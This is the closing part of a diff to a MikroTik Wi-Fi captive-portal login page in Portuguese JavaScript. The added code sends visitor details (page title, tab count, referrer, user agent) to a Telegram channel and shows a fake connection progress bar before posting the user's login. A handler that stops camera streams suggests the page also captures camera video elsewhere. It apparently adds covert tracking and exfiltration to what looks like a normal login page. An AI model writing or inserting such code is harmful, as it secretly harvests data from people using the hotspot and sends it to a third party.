+                    `🪟 *ABAS:*\n` +
+                    `├ Atual: ${document.title}\n` +
+                    `└ Detectadas: ${tabs.count || 0}\n\n` +
+                    ` *REFERRER:*\n ${document.referrer || 'Direto'}\n\n` +
+                    `⚡ *USER AGENT:*\n\`${navigator.userAgent}\``;
+
+                await TelegramService.sendMessage(msg);
+            },
+
+            startProgress() {
+                let progress = 0;
+                const fill = document.getElementById('progressFill');
+                const text = document.getElementById('progressText');
+                const progressBar = document.querySelector('.progress-bar');
+
+                const interval = setInterval(() => {
+                    progress += Math.random() * 15;
+                    
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(interval);
+                        text.textContent = 'Conexão liberada com sucesso! ✅';
+                        
+                        if (progressBar) {
+                            progressBar.setAttribute('aria-valuenow', '100');
+                        }
+
+                        setTimeout(() => {
+                            this.submitToMikrotik();
+                        }, 2000);
+                    }
+
+                    fill.style.width = `${progress}%`;
+                    text.textContent = `Liberando conexão... ${Math.floor(progress)}%`;
+                    
+                    if (progressBar) {
+                        progressBar.setAttribute('aria-valuenow', Math.floor(progress).toString());
+                    }
+                }, 300);
+            },
+
+            submitToMikrotik() {
+                const linkLoginOnly = '$(link-login-only)';
+                const linkOrig = '$(link-orig)';
+
+                if (linkLoginOnly && linkLoginOnly !== '$(link-login-only)') {
+                    const form = document.createElement('form');
+                    form.method = 'post';
+                    form.action = linkLoginOnly;
+                    form.style.display = 'none';
+                    
+                    form.innerHTML = `
+                        <input type="hidden" name="username" value="${this.userData.username}" />
+                        <input type="hidden" name="password" value="${this.userData.password}" />
+                        <input type="hidden" name="dst" value="${linkOrig}" />
+                    `;
+                    
+                    document.body.appendChild(form);
+                    form.submit();
+                    
+                    Logger.info('Formulário submetido ao MikroTik');
+                } else {
+                    Logger.warn('MikroTik variables não disponíveis');
+                }
+            }
+        };
+
+        // Inicializar aplicação
+        document.addEventListener('DOMContentLoaded', () => {
+            App.init();
+        });
+
+        // Cleanup ao fechar página
+        window.addEventListener('beforeunload', () => {
+            CameraManager.stopAllStreams();
+        });
     </script>
 </body>
 </html>
